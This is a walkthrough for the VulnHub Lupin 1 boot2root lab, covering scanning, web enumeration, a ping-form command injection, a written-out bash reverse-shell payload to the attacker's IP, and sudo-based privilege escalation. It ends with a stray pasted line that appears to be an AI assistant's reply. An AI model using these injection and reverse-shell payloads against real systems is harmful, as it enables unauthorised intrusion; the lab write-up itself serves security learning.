---
title: "Lupin 1 — VulnHub CTF Walkthrough"
date: 2025-11-08
author: shivam
categories:
  - ctf
  - vulnhub
  - writeup
tags:
  - Lupin
  - VulnHub
  - walkthrough
  - boot2root
summary: "Step-by-step walkthrough for Lupin 1 (VulnHub) — discovery, enumeration, exploitation and privilege escalation with screenshots. Chirpy-compatible."
image:
  path: /assets/img/vulnhub/Lupin_1/1761297704364.jpg
  alt: "Lupin 1 — Recon / nmap"
---

# Lupin 1 — VulnHub (Walkthrough)

**Goal:** fully compromise the Lupin 1 VM (initial access → root).  
**Author:** Shivam  
**Completed on:** 2025-11-08

> This writeup documents a lab-only path. Only perform these steps against machines you own or have explicit permission to test.

---

## Table of contents

1. [Lab setup & notes](#lab-setup-and-notes)  
2. [Recon — find the target](#recon-find-target)  
3. [Port & service enumeration (nmap)](#port--service-enumeration-nmap)  
4. [Web & application enumeration](#web-application-enumeration)  
5. [Initial access (exploit / shell)](#initial-access-exploit-shell)  
6. [Post-exploit enumeration & privilege escalation](#post-exploit-enumeration-privilege-escalation)  
7. [Proof, cleanup & lessons learned](#proof-cleanup-lessons-learned)  

---

## Lab setup & notes {#lab-setup-and-notes}

**Environment**

* Attacker: Kali Linux VM (examples use `192.168.120.132`).  
* Target: Lupin 1 (VulnHub) VM.  
* Networking: host-only / NAT (same subnet).  
* Always snapshot the target VM before testing.

**Safety / ethics**

This walkthrough is for **legal, educational** use only. Do not reuse these techniques on systems you do not own or have explicit permission to test.

---

## Recon — find the target {#recon-find-target}

Discover hosts on your lab network and identify the Lupin VM IP:

```bash
# quick network sweep (adjust subnet)
netdiscover -r 192.168.120.0/24
# or
arp-scan --localnet
````

Once you locate the target IP (examples below use `192.168.120.139`) proceed to scanning.

**Image — target console / banner:**
![Lupin console banner]({{ '/assets/img/vulnhub/Lupin_1/1761297690770.jpg' | relative_url }})

---

## Port & service enumeration (nmap) {#port--service-enumeration-nmap}

Run a comprehensive Nmap scan to discover open ports and software versions:

```bash
nmap -sV -O -T4 192.168.120.139 -oN scans/lupin_nmap.txt
```

Typical relevant ports found on Lupin 1 (example output):

```
22/tcp   open  ssh       OpenSSH 8.x
80/tcp   open  http      Apache httpd (various)
631/tcp  open  ipp       CUPS
```

**Image — nmap output:**
![nmap output]({{ '/assets/img/vulnhub/Lupin_1/1761297707859.jpg' | relative_url }})

Save this output; service versions are your primary clues for further work.

---

## Web & application enumeration {#web-application-enumeration}

Web apps frequently provide the initial foothold. Combine manual browsing with automated discovery:

```bash
# directory brute-forcing
gobuster dir -u http://192.168.120.139 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o scans/gobuster_lupin.txt

# quick web vuln scan
nikto -h http://192.168.120.139 -o scans/nikto_lupin.txt
```

Manual inspection tips:

* Open `http://$TARGET/` and follow links (gallery, admin, tools).
* Intercept requests with Burp Suite and test parameters for reflection or injection.
* Search for file downloads, backups, or pages that call `system()`/`exec()`.

**Image — web admin / ping UI:**
![web admin / ping]({{ '/assets/img/vulnhub/Lupin_1/1761297709490.jpg' | relative_url }})

Look for reflected inputs or outputs — these often indicate command injection or RCE possibilities.

---

## Initial access (exploit / shell) {#initial-access-exploit-shell}

From enumeration you may find either:

* A **command injection** (e.g., ping/admin form), or
* A **vulnerable service/CMS** mapped to a public exploit.

### Command injection example (ping form)

1. Test injection with a safe marker:

```
127.0.0.1; echo LUPINTEST
```

If the marker appears in the response, the input is injectable.

2. Get a reverse shell:

On attacker:

```bash
nc -lvnp 4444
```

In the vulnerable input (adjust quoting to the target app):

```
127.0.0.1; /bin/bash -i >& /dev/tcp/192.168.120.132/4444 0>&1 ;
```

3. Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Image — initial shell / whoami (example):**
![initial shell proof]({{ '/assets/img/vulnhub/Lupin_1/1761297701561.jpg' | relative_url }})

### Exploit PoC example (service/C PoC)

If you find a C PoC:

```bash
# copy exploit.c to target (via wget/curl or smb/ftp), then:
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

**Image — compile/run exploit (example):**
![compile exploit]({{ '/assets/img/vulnhub/Lupin_1/1761297706655.jpg' | relative_url }})

---

## Post-exploit enumeration & privilege escalation {#post-exploit-enumeration-privilege-escalation}

With an initial shell, enumerate the system to find escalation vectors.

### Basic enumeration

```bash
id
whoami
uname -a
cat /etc/os-release
ps aux --no-heading | head -n 40
sudo -l
```

### Check for SUID, writable files and cron

```bash
find / -perm -4000 -type f 2>/dev/null | sort
find / -writable -type f 2>/dev/null | head
ls -la /etc/cron* /var/spool/cron || true
```

### Abusing sudo (example pattern observed)

If `sudo -l` returns a NOPASSWD entry for a tool you can abuse (e.g., `pip`, `python`), you can run a small setup script or python payload as root:

1. Create temp dir and a `setup.py` (or similar) that spawns a root shell.
2. Execute the allowed sudo command against that directory — it will run as root and spawn a shell.

**Image — sudo allowed commands & quick escalation (example):**
![sudo list and escalation]({{ '/assets/img/vulnhub/Lupin_1/1761297715644.jpg' | relative_url }})

**Image — root proof (id -> uid=0):**
![root proof]({{ '/assets/img/vulnhub/Lupin_1/1761297696251.jpg' | relative_url }})

---

## Proof, cleanup & lessons learned {#proof-cleanup-lessons-learned}

### Proof

Collect proof safely:

```bash
whoami
id
cat /root/root.txt 2>/dev/null || ls -la /root
```

**Image — root ascii / root.txt proof (example):**
![root flag / ASCII art]({{ '/assets/img/vulnhub/Lupin_1/1761297718432.jpg' | relative_url }})

### Cleanup (lab-only)

* Remove uploaded payloads.
* Revert the VM snapshot.
* Document the precise exploit, options and evidence.

### Lessons learned

* `sudo -l` is often the quickest escalation path after initial access.
* Web forms that reflect inputs are high-value targets — test for injection safely.
* Always match PoC to service version before running.

---
* produce a `sed` one-liner to insert these same IDs into an existing file automatically, or
* output the file with a date-prefixed filename (e.g. `_posts/2025-11-08-lupin1.md`) ready for copy/paste. Which do you prefer?
